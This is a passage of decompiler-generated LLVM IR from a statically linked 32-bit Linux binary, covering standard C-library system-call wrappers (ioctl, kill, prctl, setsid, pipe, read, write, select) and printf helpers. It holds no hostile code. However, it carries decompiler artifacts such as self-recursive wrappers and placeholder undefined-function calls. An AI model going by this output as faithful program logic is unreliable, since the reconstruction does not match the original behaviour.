  %v0_8051651 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051651 = sub i32 0, %v0_8051651
  %v2_8051653 = inttoptr i32 %v1_805164c to i32*
  store i32 %v1_8051651, i32* %v2_8051653, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051658

dec_label_pc_8051658:                             ; preds = %entry, %dec_label_pc_805164c
  %v0_8051658 = phi i32 [ %v1_805163f, %entry ], [ -1, %dec_label_pc_805164c ]
  %v2_805165c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805165c, i32* @ebx, align 4
  ret i32 %v0_8051658

; uselistorder directives
  uselistorder i32 %v1_805163f, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 191, { 1, 0 }
  uselistorder label %dec_label_pc_8051658, { 1, 0 }
}

define i32 @ioctl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_8051660 = load i32, i32* @edi, align 4
  store i32 %v0_8051660, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  %v0_8051678 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v3_8051680 = call i32 @ioctl(i32 %v0_8051678, i32 %tmp9, i32 ptrtoint (i32* @0 to i32))
  store i32 %v0_8051678, i32* @ebx, align 4
  store i32 %v3_8051680, i32* %edi.global-to-local, align 4
  %tmp11 = icmp ult i32 %v3_8051680, -4095
  br i1 %tmp11, label %dec_label_pc_8051698, label %dec_label_pc_805168c

dec_label_pc_805168c:                             ; preds = %entry
  %v1_805168c = call i32 @__errno_location(i32 %v0_8051678)
  %v0_8051691 = load i32, i32* %edi.global-to-local, align 4
  %v1_8051691 = sub i32 0, %v0_8051691
  %v2_8051693 = inttoptr i32 %v1_805168c to i32*
  store i32 %v1_8051691, i32* %v2_8051693, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8051698

dec_label_pc_8051698:                             ; preds = %entry, %dec_label_pc_805168c
  %v0_8051698 = phi i32 [ %v3_8051680, %entry ], [ -1, %dec_label_pc_805168c ]
  %v2_805169d = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805169d, i32* @edi, align 4
  ret i32 %v0_8051698

; uselistorder directives
  uselistorder i32 %v3_8051680, { 1, 0, 2 }
  uselistorder i32 %v0_8051678, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051698, { 1, 0 }
}

define i32 @kill(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80516a0 = load i32, i32* @ebx, align 4
  store i32 %v0_80516a0, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v2_80516b3 = call i32 @kill(i32 %v0_80516a0, i32 %tmp4)
  store i32 %v2_80516b3, i32* %ebx.global-to-local, align 4
  %tmp8 = icmp ult i32 %v2_80516b3, -4095
  br i1 %tmp8, label %dec_label_pc_80516cc, label %dec_label_pc_80516c0

dec_label_pc_80516c0:                             ; preds = %entry
  %v0_80516c0 = load i32, i32* %stack_var_-4, align 4
  %v1_80516c0 = call i32 @__errno_location(i32 %v0_80516c0)
  %v0_80516c5 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80516c5 = sub i32 0, %v0_80516c5
  %v2_80516c7 = inttoptr i32 %v1_80516c0 to i32*
  store i32 %v1_80516c5, i32* %v2_80516c7, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80516cc

dec_label_pc_80516cc:                             ; preds = %entry, %dec_label_pc_80516c0
  %v0_80516cc = phi i32 [ %v2_80516b3, %entry ], [ -1, %dec_label_pc_80516c0 ]
  %v2_80516ce = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80516ce, i32* @edx, align 4
  %v2_80516d0 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80516d0, i32* @ebx, align 4
  ret i32 %v0_80516cc

; uselistorder directives
  uselistorder i32 %v2_80516b3, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80516cc, { 1, 0 }
}

define i32 @__libc_open(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %v0_80516d5 = load i32, i32* @ebx, align 4
  %sext = mul i32 %arg2, 16777216
  %v4_80516db = sdiv i32 %sext, 16777216
  store i32 %v4_80516db, i32* @ecx, align 4
  %v4_80516df = ptrtoint i8* %arg1 to i32
  %v3_80516e3 = and i32 %arg2, 64
  %v4_80516e3 = icmp eq i32 %v3_80516e3, 0
  br i1 %v4_80516e3, label %dec_label_pc_80516f4, label %dec_label_pc_80516e8

dec_label_pc_80516e8:                             ; preds = %entry
  %phitmp = urem i32 %tmp, 65536
  br label %dec_label_pc_80516f4

dec_label_pc_80516f4:                             ; preds = %entry, %dec_label_pc_80516e8
  %v0_80516f4 = phi i32 [ 0, %entry ], [ %phitmp, %dec_label_pc_80516e8 ]
  store i32 %v0_80516f4, i32* @edx, align 4
  store i32 %v4_80516df, i32* %ebx.global-to-local, align 4
  %v5_80516ff = call i32 (i8*, i32, ...) @open(i8* %arg1, i32 %v4_80516db)
  store i32 %v5_80516ff, i32* %ebx.global-to-local, align 4
  %tmp15 = icmp ult i32 %v5_80516ff, -4095
  br i1 %tmp15, label %dec_label_pc_8051717, label %dec_label_pc_805170b

dec_label_pc_805170b:                             ; preds = %dec_label_pc_80516f4
  %v1_805170b = call i32 @__errno_location(i32 %v0_80516d5)
  %v0_8051710 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051710 = sub i32 0, %v0_8051710
  %v2_8051712 = inttoptr i32 %v1_805170b to i32*
  store i32 %v1_8051710, i32* %v2_8051712, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051717

dec_label_pc_8051717:                             ; preds = %dec_label_pc_80516f4, %dec_label_pc_805170b
  %v0_8051717 = phi i32 [ %v5_80516ff, %dec_label_pc_80516f4 ], [ -1, %dec_label_pc_805170b ]
  store i32 %v0_80516d5, i32* @ebx, align 4
  ret i32 %v0_8051717

; uselistorder directives
  uselistorder i32 %v5_80516ff, { 1, 0, 2 }
  uselistorder i32 %v4_80516db, { 1, 0 }
  uselistorder i32 %v0_80516d5, { 1, 0 }
  uselistorder i32* %ebx.global-to-local, { 3, 0, 1, 2 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8051717, { 1, 0 }
  uselistorder label %dec_label_pc_80516f4, { 1, 0 }
}

define i32 @__libc_creat(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_805172f = inttoptr i32 %arg1 to i8*
  %v4_805172f = call i32 @__libc_open(i8* %v3_805172f, i32 577)
  ret i32 %v4_805172f
}

define i32 @__GI_pipe(i32 %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051738 = load i32, i32* @edi, align 4
  store i32 %v0_8051738, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_8051740 = load i32, i32* @ebx, align 4
  %v1_8051748 = insertvalue [2 x i32] undef, i32 %arg1, 0
  %v2_8051748 = call i32 @pipe([2 x i32] %v1_8051748)
  store i32 %v0_8051740, i32* @ebx, align 4
  store i32 %v2_8051748, i32* %edi.global-to-local, align 4
  %tmp8 = icmp ult i32 %v2_8051748, -4095
  br i1 %tmp8, label %dec_label_pc_8051760, label %dec_label_pc_8051754

dec_label_pc_8051754:                             ; preds = %entry
  %v1_8051754 = call i32 @__errno_location(i32 %v0_8051740)
  %v0_8051759 = load i32, i32* %edi.global-to-local, align 4
  %v1_8051759 = sub i32 0, %v0_8051759
  %v2_805175b = inttoptr i32 %v1_8051754 to i32*
  store i32 %v1_8051759, i32* %v2_805175b, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8051760

dec_label_pc_8051760:                             ; preds = %entry, %dec_label_pc_8051754
  %v0_8051760 = phi i32 [ %v2_8051748, %entry ], [ -1, %dec_label_pc_8051754 ]
  %v2_8051764 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051764, i32* @edi, align 4
  ret i32 %v0_8051760

; uselistorder directives
  uselistorder i32 %v2_8051748, { 1, 0, 2 }
  uselistorder i32 %v0_8051740, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8051760, { 1, 0 }
}

define i32 @prctl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_8051768 = load i32, i32* @edi, align 4
  %v0_8051769 = load i32, i32* @esi, align 4
  store i32 %v0_8051769, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* @esi, align 4
  store i32 %arg5, i32* @edi, align 4
  %v0_8051781 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v5_8051789 = call i32 @prctl(i32 %v0_8051781, i32 %v0_8051769, i32 %v0_8051768, i32 %tmp6, i32 %arg1)
  store i32 %v0_8051781, i32* @ebx, align 4
  store i32 %v5_8051789, i32* %esi.global-to-local, align 4
  %tmp11 = icmp ult i32 %v5_8051789, -4095
  br i1 %tmp11, label %dec_label_pc_80517a1, label %dec_label_pc_8051795

dec_label_pc_8051795:                             ; preds = %entry
  %v1_8051795 = call i32 @__errno_location(i32 %v0_8051781)
  %v0_805179a = load i32, i32* %esi.global-to-local, align 4
  %v1_805179a = sub i32 0, %v0_805179a
  %v2_805179c = inttoptr i32 %v1_8051795 to i32*
  store i32 %v1_805179a, i32* %v2_805179c, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80517a1

dec_label_pc_80517a1:                             ; preds = %entry, %dec_label_pc_8051795
  %v0_80517a1 = phi i32 [ %v5_8051789, %entry ], [ -1, %dec_label_pc_8051795 ]
  %v2_80517a4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80517a4, i32* @esi, align 4
  store i32 %v0_8051768, i32* @edi, align 4
  ret i32 %v0_80517a1

; uselistorder directives
  uselistorder i32 %v5_8051789, { 1, 0, 2 }
  uselistorder i32 %v0_8051781, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @prctl, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80517a1, { 1, 0 }
}

define i32 @__libc_read(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80517a8 = load i32, i32* @edi, align 4
  store i32 %v0_80517a8, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_80517b8 = load i32, i32* @ebx, align 4
  %v4_80517c0 = call i32 @read(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v0_80517b8, i32* @ebx, align 4
  store i32 %v4_80517c0, i32* %edi.global-to-local, align 4
  %tmp11 = icmp ult i32 %v4_80517c0, -4095
  br i1 %tmp11, label %dec_label_pc_80517d8, label %dec_label_pc_80517cc

dec_label_pc_80517cc:                             ; preds = %entry
  %v1_80517cc = call i32 @__errno_location(i32 %v0_80517b8)
  %v0_80517d1 = load i32, i32* %edi.global-to-local, align 4
  %v1_80517d1 = sub i32 0, %v0_80517d1
  %v2_80517d3 = inttoptr i32 %v1_80517cc to i32*
  store i32 %v1_80517d1, i32* %v2_80517d3, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_80517d8

dec_label_pc_80517d8:                             ; preds = %entry, %dec_label_pc_80517cc
  %v0_80517d8 = phi i32 [ %v4_80517c0, %entry ], [ -1, %dec_label_pc_80517cc ]
  %v2_80517dc = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80517dc, i32* @edi, align 4
  ret i32 %v0_80517d8

; uselistorder directives
  uselistorder i32 %v4_80517c0, { 1, 0, 2 }
  uselistorder i32 %v0_80517b8, { 1, 0 }
  uselistorder label %dec_label_pc_80517d8, { 1, 0 }
}

define i32 @__libc_select(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_80517e1 = load i32, i32* @esi, align 4
  store i32 %v0_80517e1, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_80517f9 = load i32, i32* @ebx, align 4
  %v1_8051801 = call i32 @int80_syscall(i32 142)
  store i32 %v0_80517f9, i32* @ebx, align 4
  store i32 %v1_8051801, i32* %esi.global-to-local, align 4
  %tmp11 = icmp ult i32 %v1_8051801, -4095
  br i1 %tmp11, label %dec_label_pc_8051819, label %dec_label_pc_805180d

dec_label_pc_805180d:                             ; preds = %entry
  %v1_805180d = call i32 @__errno_location(i32 %v0_80517f9)
  %v0_8051812 = load i32, i32* %esi.global-to-local, align 4
  %v1_8051812 = sub i32 0, %v0_8051812
  %v2_8051814 = inttoptr i32 %v1_805180d to i32*
  store i32 %v1_8051812, i32* %v2_8051814, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8051819

dec_label_pc_8051819:                             ; preds = %entry, %dec_label_pc_805180d
  %v0_8051819 = phi i32 [ %v1_8051801, %entry ], [ -1, %dec_label_pc_805180d ]
  %v2_805181b = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805181b, i32* @edx, align 4
  %v2_805181c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_805181c, i32* @esi, align 4
  ret i32 %v0_8051819

; uselistorder directives
  uselistorder i32 %v1_8051801, { 1, 0, 2 }
  uselistorder i32 %v0_80517f9, { 1, 0 }
  uselistorder i32 142, { 1, 0 }
  uselistorder label %dec_label_pc_8051819, { 1, 0 }
}

define i32 @__GI_setsid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051820 = load i32, i32* @ebx, align 4
  store i32 %v0_8051820, i32* %stack_var_-4, align 4
  %v1_8051829 = call i32 @setsid(i32 %v0_8051820)
  store i32 %v1_8051829, i32* %ebx.global-to-local, align 4
  %tmp6 = icmp ult i32 %v1_8051829, -4095
  br i1 %tmp6, label %dec_label_pc_8051840, label %dec_label_pc_8051834

dec_label_pc_8051834:                             ; preds = %entry
  %v0_8051834 = load i32, i32* %stack_var_-4, align 4
  %v1_8051834 = call i32 @__errno_location(i32 %v0_8051834)
  %v0_8051839 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051839 = sub i32 0, %v0_8051839
  %v2_805183b = inttoptr i32 %v1_8051834 to i32*
  store i32 %v1_8051839, i32* %v2_805183b, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051840

dec_label_pc_8051840:                             ; preds = %entry, %dec_label_pc_8051834
  %v0_8051840 = phi i32 [ %v1_8051829, %entry ], [ -1, %dec_label_pc_8051834 ]
  %v2_8051844 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051844, i32* @ebx, align 4
  ret i32 %v0_8051840

; uselistorder directives
  uselistorder i32 %v1_8051829, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051840, { 1, 0 }
}

define i32 @__GI_sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp3 = inttoptr i32 %arg3 to %_TYPEDEF_sigset_t*
  %stack_var_-12 = alloca i32, align 4
  %v0_8051849 = load i32, i32* @esi, align 4
  %v4_805184d = ptrtoint %_TYPEDEF_sigset_t* %arg2 to i32
  store i32 %v4_805184d, i32* @ecx, align 4
  %v2_8051859 = icmp eq %_TYPEDEF_sigset_t* %arg2, null
  br i1 %v2_8051859, label %dec_label_pc_8051872, label %dec_label_pc_805185d

dec_label_pc_805185d:                             ; preds = %entry
  %tmp11 = icmp ult i32 %arg1, 3
  br i1 %tmp11, label %dec_label_pc_8051872, label %dec_label_pc_8051862

dec_label_pc_8051862:                             ; preds = %dec_label_pc_805185d
  %v1_8051862 = call i32 @__errno_location(i32 %v0_8051849)
  %v1_8051867 = inttoptr i32 %v1_8051862 to i32*
  store i32 22, i32* %v1_8051867, align 4
  br label %dec_label_pc_8051899

dec_label_pc_8051872:                             ; preds = %dec_label_pc_805185d, %entry
  store i32 8, i32* %esi.global-to-local, align 4
  %v0_8051877 = load i32, i32* @ebx, align 4
  %v7_805187f = call i32 @sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, %_TYPEDEF_sigset_t* %tmp3)
  store i32 %v0_8051877, i32* @ebx, align 4
  store i32 %v7_805187f, i32* %esi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v7_805187f, -4095
  br i1 %tmp12, label %dec_label_pc_8051899, label %dec_label_pc_805188b

dec_label_pc_805188b:                             ; preds = %dec_label_pc_8051872
  %v1_805188b = call i32 @__errno_location(i32 %v0_8051877)
  %v0_8051890 = load i32, i32* %esi.global-to-local, align 4
  %v1_8051890 = sub i32 0, %v0_8051890
  %v2_8051892 = inttoptr i32 %v1_805188b to i32*
  store i32 %v1_8051890, i32* %v2_8051892, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8051899

dec_label_pc_8051899:                             ; preds = %dec_label_pc_805188b, %dec_label_pc_8051872, %dec_label_pc_8051862
  %storemerge = phi i32 [ -1, %dec_label_pc_8051862 ], [ %v7_805187f, %dec_label_pc_8051872 ], [ -1, %dec_label_pc_805188b ]
  %v2_8051899 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8051899, i32* @edx, align 4
  store i32 %v0_8051849, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v7_805187f, { 1, 0, 2 }
  uselistorder i32 %v0_8051877, { 1, 0 }
  uselistorder %_TYPEDEF_sigset_t* %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @__GI_time(i32* %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80518a0 = load i32, i32* @edi, align 4
  store i32 %v0_80518a0, i32* %stack_var_-4, align 4
  store i32 %tmp3, i32* %edi.global-to-local, align 4
  %v0_80518a8 = load i32, i32* @ebx, align 4
  %v2_80518b0 = call i32 @time(i32* %arg1)
  store i32 %v0_80518a8, i32* @ebx, align 4
  store i32 %v2_80518b0, i32* %edi.global-to-local, align 4
  %tmp9 = icmp ult i32 %v2_80518b0, -4095
  br i1 %tmp9, label %dec_label_pc_80518c8, label %dec_label_pc_80518bc

dec_label_pc_80518bc:                             ; preds = %entry
  %v1_80518bc = call i32 @__errno_location(i32 %v0_80518a8)
  %v0_80518c1 = load i32, i32* %edi.global-to-local, align 4
  %v1_80518c1 = sub i32 0, %v0_80518c1
  %v2_80518c3 = inttoptr i32 %v1_80518bc to i32*
  store i32 %v1_80518c1, i32* %v2_80518c3, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_80518c8

dec_label_pc_80518c8:                             ; preds = %entry, %dec_label_pc_80518bc
  %v0_80518c8 = phi i32 [ %v2_80518b0, %entry ], [ -1, %dec_label_pc_80518bc ]
  %v2_80518ca = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80518ca, i32* @edx, align 4
  %v2_80518cc = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80518cc, i32* @edi, align 4
  ret i32 %v0_80518c8

; uselistorder directives
  uselistorder i32 %v2_80518b0, { 1, 0, 2 }
  uselistorder i32 %v0_80518a8, { 1, 0 }
  uselistorder label %dec_label_pc_80518c8, { 1, 0 }
}

define i32 @__libc_waitpid(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v4_80518e1 = call i32 @wait4(i32 %arg1, i32 %arg2, i32 %arg3, i32 0)
  ret i32 %v4_80518e1
}

define i32 @__libc_write(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80518ec = load i32, i32* @edi, align 4
  store i32 %v0_80518ec, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_80518fc = load i32, i32* @ebx, align 4
  %v4_8051904 = call i32 @write(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v0_80518fc, i32* @ebx, align 4
  store i32 %v4_8051904, i32* %edi.global-to-local, align 4
  %tmp11 = icmp ult i32 %v4_8051904, -4095
  br i1 %tmp11, label %dec_label_pc_805191c, label %dec_label_pc_8051910

dec_label_pc_8051910:                             ; preds = %entry
  %v1_8051910 = call i32 @__errno_location(i32 %v0_80518fc)
  %v0_8051915 = load i32, i32* %edi.global-to-local, align 4
  %v1_8051915 = sub i32 0, %v0_8051915
  %v2_8051917 = inttoptr i32 %v1_8051910 to i32*
  store i32 %v1_8051915, i32* %v2_8051917, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_805191c

dec_label_pc_805191c:                             ; preds = %entry, %dec_label_pc_8051910
  %v0_805191c = phi i32 [ %v4_8051904, %entry ], [ -1, %dec_label_pc_8051910 ]
  %v2_805191e = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805191e, i32* @edx, align 4
  %v2_8051920 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051920, i32* @edi, align 4
  ret i32 %v0_805191c

; uselistorder directives
  uselistorder i32 %v4_8051904, { 1, 0, 2 }
  uselistorder i32 %v0_80518fc, { 1, 0 }
  uselistorder label %dec_label_pc_805191c, { 1, 0 }
}

define i32 @isspace(i32 %arg1) local_unnamed_addr {
entry:
  %v0_8051928 = load i32, i32* inttoptr (i32 134599144 to i32*), align 8
  %v2_805192d = mul i32 %arg1, 2
  %v3_805192d = add i32 %v0_8051928, %v2_805192d
  %v4_805192d = inttoptr i32 %v3_805192d to i16*
  %v5_805192d = load i16, i16* %v4_805192d, align 2
  %v6_805192d = zext i16 %v5_805192d to i32
  %v1_8051931 = and i32 %v6_805192d, 32
  ret i32 %v1_8051931
}

define i32 @__GI_toupper(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @edx, align 4
  %v1_805193c = add i32 %arg1, 128
  %v6_8051947 = icmp ugt i32 %v1_805193c, 383
  br i1 %v6_8051947, label %dec_label_pc_8051952, label %dec_label_pc_8051949

dec_label_pc_8051949:                             ; preds = %entry
  %v0_8051949 = load i32, i32* inttoptr (i32 134599152 to i32*), align 16
  %v2_805194e = mul i32 %arg1, 2
  %v3_805194e = add i32 %v0_8051949, %v2_805194e
  %v4_805194e = inttoptr i32 %v3_805194e to i16*
  %v5_805194e = load i16, i16* %v4_805194e, align 2
  %v6_805194e = sext i16 %v5_805194e to i32
  store i32 %v6_805194e, i32* @edx, align 4
  br label %dec_label_pc_8051952

dec_label_pc_8051952:                             ; preds = %entry, %dec_label_pc_8051949
  %v0_8051952 = phi i32 [ %arg1, %entry ], [ %v6_805194e, %dec_label_pc_8051949 ]
  ret i32 %v0_8051952

; uselistorder directives
  uselistorder label %dec_label_pc_8051952, { 1, 0 }
}

define i32 @__errno_location(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_80636e0.485 to i32)
}

declare i32 @printf(i8*, ...) local_unnamed_addr

define i32 @__GI_snprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_16 = alloca i32, align 4
  %v2_8051983 = ptrtoint i32* %stack_var_16 to i32
  %v4_8051998 = inttoptr i32 %arg1 to i8*
  %v5_8051998 = call i32 @__GI_vsnprintf(i8* %v4_8051998, i32 %arg2, i32 %arg3, i32 %v2_8051983)
  ret i32 %v5_8051998
}

define i32 @sprintf(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_12 = alloca i32, align 4
  %v2_80519a7 = ptrtoint i32* %stack_var_12 to i32
  %v4_80519ba = inttoptr i32 %arg1 to i8*
  %v5_80519ba = call i32 @__GI_vsnprintf(i8* %v4_80519ba, i32 -1, i32 %arg2, i32 %v2_80519a7)
  ret i32 %v5_80519ba

; uselistorder directives
  uselistorder i32 (i8*, i32, i32, i32)* @__GI_vsnprintf, { 1, 0 }
}

define i32 @__GI_vsnprintf(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_80519c4 = load i32, i32* @ebp, align 4
  %v0_80519c5 = load i32, i32* @edi, align 4
  %v0_80519c6 = load i32, i32* @esi, align 4
  %v0_80519c7 = load i32, i32* @ebx, align 4
  store i32 %v0_80519c7, i32* %stack_var_-16, align 4
  %v4_80519cb = ptrtoint i8* %arg1 to i32
  store i32 %v4_80519cb, i32* @esi, align 4
  %v2_80519cf = ptrtoint i32* %stack_var_-40 to i32
  store i32 %arg2, i32* @edi, align 4
  store i32 208, i32* %stack_var_-96, align 4
  %v2_8051a00 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_8051a00, i32* @ebp, align 4
  %v1_8051a04 = sub i32 -1, %v4_80519cb
  store i32 %v1_8051a04, i32* @ebx, align 4
  %v1_8051a07 = call i32 @__stdio_init_mutex(i32 %v2_80519cf)
  %v0_8051a17 = load i32, i32* @ebx, align 4
  %v1_8051a17 = load i32, i32* @edi, align 4
  %tmp30 = icmp ugt i32 %v0_8051a17, %v1_8051a17
  br i1 %tmp30, label %dec_label_pc_8051a1b, label %dec_label_pc_8051a1d

dec_label_pc_8051a1b:                             ; preds = %entry
  store i32 %v1_8051a17, i32* @ebx, align 4
  br label %dec_label_pc_8051a1d

dec_label_pc_8051a1d:                             ; preds = %entry, %dec_label_pc_8051a1b
  %v1_8051a1d = phi i32 [ %v0_8051a17, %entry ], [ %v1_8051a17, %dec_label_pc_8051a1b ]
  %v0_8051a1d = load i32, i32* @esi, align 4
  %v2_8051a1d = add i32 %v0_8051a1d, %v1_8051a1d
  %v4_8051a48 = inttoptr i32 %arg3 to i8*
  %v5_8051a48 = call i32 @_vfprintf_internal(i32 %v2_8051a00, i8* %v4_8051a48, i32 %arg4, i32 %v2_8051a1d)
  store i32 %v5_8051a48, i32* @edx, align 4
  %v0_8051a52 = load i32, i32* @ebx, align 4
  %v1_8051a52 = icmp eq i32 %v0_8051a52, 0
  br i1 %v1_8051a52, label %dec_label_pc_8051a6c, label %dec_label_pc_8051a56

dec_label_pc_8051a56:                             ; preds = %dec_label_pc_8051a1d
  %v16_8051a5a = icmp eq i32 %v1_8051a1d, 0
  %v1_8051a5e = icmp eq i1 %v16_8051a5a, false
  br i1 %v1_8051a5e, label %dec_label_pc_8051a65, label %dec_label_pc_8051a60

dec_label_pc_8051a60:                             ; preds = %dec_label_pc_8051a56
  %v1_8051a60 = add i32 %v2_8051a1d, -1
  br label %dec_label_pc_8051a65

dec_label_pc_8051a65:                             ; preds = %dec_label_pc_8051a56, %dec_label_pc_8051a60
  %stack_var_-80.0.in = phi i32 [ %v0_8051a1d, %dec_label_pc_8051a56 ], [ %v1_8051a60, %dec_label_pc_8051a60 ]
  %stack_var_-80.0 = inttoptr i32 %stack_var_-80.0.in to i8*
  store i8 0, i8* %stack_var_-80.0, align 1
  %v0_8051a6f.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8051a6c

dec_label_pc_8051a6c:                             ; preds = %dec_label_pc_8051a1d, %dec_label_pc_8051a65
  %v0_8051a6f = phi i32 [ %v5_8051a48, %dec_label_pc_8051a1d ], [ %v0_8051a6f.pre, %dec_label_pc_8051a65 ]
  %v2_8051a71 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8051a71, i32* @ebx, align 4
  store i32 %v0_80519c6, i32* @esi, align 4
  store i32 %v0_80519c5, i32* @edi, align 4
  store i32 %v0_80519c4, i32* @ebp, align 4
  ret i32 %v0_8051a6f

; uselistorder directives
  uselistorder i32 %v0_8051a1d, { 1, 0 }
  uselistorder i32 %v1_8051a1d, { 1, 0 }
  uselistorder i32 %v1_8051a17, { 1, 2, 0 }
  uselistorder i32 %v0_8051a17, { 1, 0 }
  uselistorder i32* %stack_var_-96, { 1, 0 }
  uselistorder i32 208, { 1, 0 }
  uselistorder label %dec_label_pc_8051a6c, { 1, 0 }
  uselistorder label %dec_label_pc_8051a65, { 1, 0 }
  uselistorder label %dec_label_pc_8051a1d, { 1, 0 }
}

define i32 @_stdio_init() local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8051a79 = load i32, i32* @edi, align 4
